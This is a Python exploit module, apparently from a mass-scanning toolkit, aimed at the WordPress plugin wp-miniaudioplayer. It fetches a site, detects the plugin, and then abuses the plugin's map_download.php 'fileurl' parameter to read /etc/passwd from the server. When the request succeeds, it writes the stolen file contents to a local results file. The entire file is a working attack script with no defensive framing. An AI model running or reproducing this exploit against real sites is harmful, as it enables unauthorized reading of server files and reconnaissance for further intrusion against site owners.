# coding=utf-8
import requests
from Exploits import printModule


r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        CheckVuln = requests.get('http://' + site, timeout=10, headers=Headers)
        if 'wp-miniaudioplayer' in CheckVuln.content:
            etc = requests.get('http://' + site +
                               '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd',
                               timeout=5, headers=Headers)
            if 'nologin' in etc.content:
                with open('result/Passwd_file.content', 'a') as writer:
                    writer.write('---------------------------\nSite: ' + site + '\n' + etc.content + '\n')
                return printModule.returnYes(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'wp-miniaudioplayer', 'Wordpress')
